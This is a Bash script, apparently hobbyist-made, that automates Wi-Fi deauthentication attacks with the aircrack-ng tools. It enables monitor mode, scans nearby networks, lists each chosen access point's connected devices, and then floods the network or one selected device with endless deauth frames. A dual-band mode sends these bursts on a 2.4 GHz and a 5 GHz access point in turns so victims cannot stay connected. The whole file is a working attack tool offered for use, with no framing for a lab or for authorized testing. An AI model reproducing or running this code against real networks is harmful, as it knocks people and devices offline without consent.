#!/bin/bash

# Arrays globais para armazenar BSSIDs e canais selecionados
selected_bssids=()
selected_channels=()
monitor_interfaces=()

# Function to check script requirements
check_requirements() {
    if [[ $EUID -ne 0 ]]; then
        echo "[ ! ] This script must be run as root."
        exit 1
    fi

    for cmd in airmon-ng airodump-ng aireplay-ng x-terminal-emulator; do
        if ! command -v "$cmd" &> /dev/null; then
            echo "[ ! ] Command '$cmd' is not installed. Please install it before proceeding."
            exit 1
        fi
    done
    echo "[ + ] All requirements are met."
}

# Function to enable monitor mode on a selected interface
enable_monitor_mode() {
    # List physical interfaces, ignoring loopback and virtual interfaces
    interfaces=$(ip link show | grep -E '^[0-9]+: (e|w)' | awk -F': ' '{print $2}')
    
    if [ -z "$interfaces" ]; then
        echo "[ ! ] No physical interfaces found."
        return
    fi
    
    echo "[ + ] Available physical interfaces:"
    select interface in $interfaces; do
        if [ -z "$interface" ]; then
            echo "[ ! ] Invalid option. Please choose a valid number."
        else
            echo "[ + ] You selected the interface: $interface"
            
            # Check if the interface is already in monitor mode
            mode=$(iw dev "$interface" info | grep -oP 'type\s+\K\w+')

            if [ "$mode" == "monitor" ]; then
                echo "[ + ] The interface $interface is already in monitor mode."
                monitor_interfaces+=("${interface}")
                return
            else
                # Enable monitor mode on the interface using airmon-ng
                sudo airmon-ng start "$interface"
                monitor_interfaces+=("${interface}mon")
                echo "[ + ] Monitor mode enabled on $interface."
            fi
            break
        fi
    done
}

# Function to disable monitor mode
disable_monitor_mode() {
    # List interfaces in monitor mode
    interfaces=$(iw dev | grep Interface | awk '{print $2}')

    if [ -z "$interfaces" ]; then
        echo "[ ! ] No interfaces in monitor mode found."
        return
    fi

    echo "[ + ] Available interfaces in monitor mode:"
    select interface in $interfaces; do
        if [ -z "$interface" ]; then
            echo "[ ! ] Invalid option. Please choose a valid number."
        else
            echo "[ + ] Disabling monitor mode on $interface..."
            sudo airmon-ng stop "$interface"
            echo "[ + ] Monitor mode disabled on $interface."
            break
        fi
    done
}

# Function to capture available networks
capture_networks() {
    csv_file="/tmp/airodump_output-01.csv"
    rm -f "$csv_file"
    echo "[ + ] Starting network capture. Please close the window when done..."
    x-terminal-emulator -e bash -c "airodump-ng --band abg --write-interval 1 --output-format csv -w /tmp/airodump_output ${monitor_interfaces[*]}; bash"
    
    # Wait until the CSV file is created
    while [ ! -f "$csv_file" ]; do
        echo "[ + ] Waiting for network capture to complete..."
        sleep 2
    done

    echo "[ + ] Network capture completed."
}

# Function to list captured networks
list_networks() {
    echo -e "[ + ] Available networks:\n"
    echo -e "No. | BSSID              | Channel | Signal (dBm) | SSID"
    echo "--------------------------------------------------------"
    mapfile -t networks < <(awk -F',' 'NR>2 && NF > 13 {print $1","$4","$9","$14}' "$csv_file" | grep -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | sort -t',' -k3 -nr)
    for i in "${!networks[@]}"; do
        bssid=$(echo "${networks[$i]}" | cut -d',' -f1)
        channel=$(echo "${networks[$i]}" | cut -d',' -f2)
        signal=$(echo "${networks[$i]}" | cut -d',' -f3)
        ssid=$(echo "${networks[$i]}" | cut -d',' -f4)
        printf "%3d | %-17s | %-5s | %-10s | %s\n" "$((i+1))" "$bssid" "$channel" "$signal" "$ssid"
    done
}

# Function to select a BSSID
select_bssid() {
    read -p "[ ? ] Select a BSSID by number: " choice
    if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -ge 1 && "$choice" -le "${#networks[@]}" ]]; then
        selected_bssid=$(echo "${networks[$((choice-1))]}" | cut -d',' -f1)
        selected_channel=$(echo "${networks[$((choice-1))]}" | cut -d',' -f2)
        echo "[ + ] You selected: $selected_bssid (Channel: $selected_channel)"
    else
        echo "[ ! ] Invalid selection."
        exit 1
    fi
}

# Function to select two BSSIDs
select_two_bssids() {
    selected_bssids=()  # Limpa o array de BSSIDs selecionados
    selected_channels=()  # Limpa o array de canais selecionados

    for i in {1..2}; do
        read -p "[ ? ] Select a BSSID by number: " choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -ge 1 && "$choice" -le "${#networks[@]}" ]]; then
            bssid=$(echo "${networks[$((choice-1))]}" | cut -d',' -f1)
            channel=$(echo "${networks[$((choice-1))]}" | cut -d',' -f2)
            selected_bssids+=("$bssid")
            selected_channels+=("$channel")
            echo "[ + ] You selected BSSID $i: $bssid (Channel: $channel)"
        else
            echo "[ ! ] Invalid selection."
            exit 1
        fi
    done

    echo "[ + ] First BSSID selected: ${selected_bssids[0]} (Channel: ${selected_channels[0]})"
    echo "[ + ] Second BSSID selected: ${selected_bssids[1]} (Channel: ${selected_channels[1]})"
}

# Function to find connected devices
find_connected_devices() {
    if [ -z "${selected_bssids[*]}" ]; then
        echo "[ ! ] No BSSIDs selected. Please select a BSSID first."
        return 1
    fi

    echo "[ + ] Available BSSIDs for scanning:"
    for i in "${!selected_bssids[@]}"; do
        echo "$((i+1)). ${selected_bssids[$i]} (Channel: ${selected_channels[$i]})"
    done

    read -p "[ ? ] Which BSSID do you want to scan for connected devices? (Enter the number): " bssid_choice
    if [[ "$bssid_choice" =~ ^[0-9]+$ ]] && [[ "$bssid_choice" -ge 1 && "$bssid_choice" -le "${#selected_bssids[@]}" ]]; then
        selected_bssid="${selected_bssids[$((bssid_choice-1))]}"
        selected_channel="${selected_channels[$((bssid_choice-1))]}"
    else
        echo "[ ! ] Invalid choice."
        return 1
    fi

    read -p "[ ? ] Do you want to find devices connected to the network $selected_bssid? (y/n): " response
    if [[ "$response" =~ ^[Yy]$ ]]; then
        clients_file="/tmp/airodump_clients-01.csv"
        rm -f "$clients_file"
        echo "[ + ] Scanning for connected devices. Please close the window when done..."
        x-terminal-emulator -e bash -c "airodump-ng --band abg --bssid $selected_bssid --channel $selected_channel --write-interval 1 --output-format csv -w /tmp/airodump_clients ${monitor_interfaces[*]}; bash"
        
        # Wait until the CSV file is created
        while [ ! -f "$clients_file" ]; do
            echo "[ + ] Waiting for device scan to complete..."
            sleep 2
        done

        echo -e "\n[ + ] Devices connected to the network $selected_bssid:"
        echo "--------------------------------------"
        mapfile -t devices < <(awk -F',' 'NR>2 && NF > 6 {print $1","$9}' "$clients_file" | grep -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | sort -t',' -k2 -nr)
        for i in "${!devices[@]}"; do
            mac=$(echo "${devices[$i]}" | cut -d',' -f1)
            signal=$(echo "${devices[$i]}" | cut -d',' -f2)
            printf "%3d | %-17s | %-10s\n" "$((i+1))" "$mac" "$signal"
        done
    fi
}

# Function to select a connected device
select_device() {
    if [ -z "${devices[*]}" ]; then
        echo "[ ! ] No devices available for selection."
        return 1
    fi

    read -p "[ ? ] Select a device by number: " choice
    if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -ge 1 && "$choice" -le "${#devices[@]}" ]]; then
        selected_device=$(echo "${devices[$((choice-1))]}" | cut -d',' -f1)
        echo "[ + ] You selected the device: $selected_device"
    else
        echo "[ ! ] Invalid selection."
        return 1
    fi
}

# Function to perform cleanup
cleanup() {
    rm -f "$csv_file" "$clients_file"
    echo "[ + ] Script finished."
}

# Function for normal deauthentication attack
normal_deauth() {
    enable_monitor_mode
    capture_networks
    list_networks
    select_bssid
    find_connected_devices
    select_device
    cleanup

    sleep 1
    
    # Interface Wi-Fi (monitor mode)
    IFACE="${monitor_interfaces[*]}"

    # BSSID and channel
    BSSID="$selected_bssid"
    CH="$selected_channel"

    # Target device (MAC address)
    TARGET="$selected_device"

    # Check if a target is provided
    if [ -z "$TARGET" ]; then
        echo "[ + ] No specific target provided. The attack will target the entire network."
        ATTACK_CMD="-a"
    else
        echo "[ + ] Targeting specific device: $TARGET"
        ATTACK_CMD="-c $TARGET -a"
    fi

    echo "[ + ] Starting deauthentication attack..."
    echo "[ + ] Press Ctrl+C to stop."

    # Deauthentication attack
    iwconfig "$IFACE" channel "$CH"
    aireplay-ng --deauth 0 "$ATTACK_CMD" "$BSSID" "$IFACE" &
}

# Function for dual-band deauthentication attack
dual_deauth() {
    enable_monitor_mode
    capture_networks
    list_networks
    select_two_bssids
    find_connected_devices
    select_device
    cleanup

    sleep 1
    
    # Interface Wi-Fi (monitor mode)
    IFACE="${monitor_interfaces[*]}"

    # Initialize variables for 2.4 GHz and 5 GHz BSSIDs and channels
    BSSID_24G=""
    CH_24G=""
    BSSID_5G=""
    CH_5G=""

    # Assign BSSIDs to 2.4 GHz or 5 GHz based on channel
    for i in "${!selected_bssids[@]}"; do
        bssid="${selected_bssids[$i]}"
        channel="${selected_channels[$i]}"

        if [[ $channel -ge 1 && $channel -le 14 ]]; then
            # 2.4 GHz band
            BSSID_24G="$bssid"
            CH_24G="$channel"
        elif [[ $channel -ge 36 ]]; then
            # 5 GHz band
            BSSID_5G="$bssid"
            CH_5G="$channel"
        else
            echo "[ ! ] Invalid channel detected: $channel"
            exit 1
        fi
    done

    # Verify if both 2.4 GHz and 5 GHz BSSIDs are selected
    if [ -z "$BSSID_24G" ] || [ -z "$BSSID_5G" ]; then
        echo "[ ! ] Error: You must select one BSSID in the 2.4 GHz band and one in the 5 GHz band."
        exit 1
    fi

    # Target device (MAC address)
    TARGET="$selected_device"

    # Switch time (seconds)
    SWITCH_TIME=0.1  # Switch every 0.1s

    # Check if a target is provided
    if [ -z "$TARGET" ]; then
        echo "[ + ] No specific target provided. The attack will target the entire network."
        ATTACK_CMD="-a"
    else
        echo "[ + ] Targeting specific device: $TARGET"
        ATTACK_CMD="-c $TARGET -a"
    fi

    echo "[ + ] Starting dual-band deauthentication attack..."
    echo "[ + ] Press Ctrl+C to stop."

    # Continuous switching loop
    while true; do
        # Switch to 2.4 GHz channel and send deauth packets
        echo "[ + ] Switching to 2.4 GHz channel: $CH_24G"
        iwconfig "$IFACE" channel "$CH_24G"
        aireplay-ng --deauth 15 "$ATTACK_CMD" "$BSSID_24G" "$IFACE" &
        sleep "$SWITCH_TIME"

        # Switch to 5 GHz channel and send deauth packets
        echo "[ + ] Switching to 5 GHz channel: $CH_5G"
        iwconfig "$IFACE" channel "$CH_5G"
        aireplay-ng --deauth 15 "$ATTACK_CMD" "$BSSID_5G" "$IFACE" &
        sleep "$SWITCH_TIME"
    done
}

# Main menu
menu() {
    while true; do
        clear
        echo "Made By TR :3"
        echo "[ + ] Choose an option:"
        echo "1. Enable monitor mode"
        echo "2. Perform deauthentication attacks"
        echo "3. Disable monitor mode"
        echo "4. Exit"
        read -p "[ ? ] Choose an option (1-4): " option

        case $option in
            1)	
                clear
                echo "[ + ] You chose option 1: Enable monitor mode."
                enable_monitor_mode
                read -p "[ + ] Press Enter to return to the main menu."
                ;;
            2)
                clear
                echo "[ + ] Choose the type of deauthentication attack:"
                echo "1. Normal deauthentication attack"
                echo "2. Dual-band deauthentication attack"
                read -p "[ ? ] Choose an option (1 or 2): " attack
                case $attack in
                    1)
                        clear
                        echo "[ + ] Normal deauthentication attack selected."
                        normal_deauth
                        ;;
                    2)
                        clear
                        echo "[ + ] Dual-band deauthentication attack selected."
                        dual_deauth
                        ;;
                    *)
                        clear
                        echo "[ ! ] Invalid option."
                        ;;
                esac
                read -p "[ + ] Press Enter to return to the main menu."
                ;;
            3)
                clear
                echo "[ + ] You chose option 3: Disable monitor mode."
                disable_monitor_mode
                read -p "[ + ] Press Enter to return to the main menu."
                ;;
            4)
                clear
                echo "[ + ] Exiting..."
                exit 0
                ;;
            *)
                clear
                echo "[ ! ] Invalid option."
                read -p "[ + ] Press Enter to return to the main menu."
                ;;
        esac
    done
}

# Start script
check_requirements
menu
